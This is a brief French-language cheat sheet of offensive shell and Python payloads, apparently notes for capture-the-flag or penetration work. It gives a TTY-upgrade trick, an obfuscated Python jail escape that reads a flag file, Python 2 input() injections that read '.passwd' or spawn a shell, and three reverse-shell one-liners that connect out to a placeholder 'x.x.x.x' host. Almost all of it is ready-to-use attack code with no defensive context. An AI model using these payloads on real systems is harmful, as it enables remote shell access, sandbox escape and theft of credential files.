# Better shell
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")';export TERM=xterm-256color
[CTRL + Z]
stty raw -echo; fg
[ENTER] * 2
```

# Escape Python Jails
Utilisation de builtins :
```python
__builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('cat flag.txt')
```

# Exploit input (Python2)
En cas d'utilisation de input() dans des cas comme p = input('Your password ?'), il est possible d'affecter la variable p à des commandes comme :
```python
sys.stdout.write(open(".passwd").readline()) 
__import__('os').system('cat .passwd > /tmp/flag')
__import__('os').system('sh') (obtenir un shell)
input(open(".passwd").readline())
```
etc...

# Reverse shell avec find
```bash
find /usr/bin/python3 -exec {} -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("x.x.x.x",xxxx));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' \; 
```

# Reverse shell en utilisation un fichier py
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("x.x.x.x",xxxx));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);ip=subprocess.call(["/bin/sh","-i"]); 
```

# Reverse shell en bash
```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("x.x.x.x",xxxx));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")' 
```
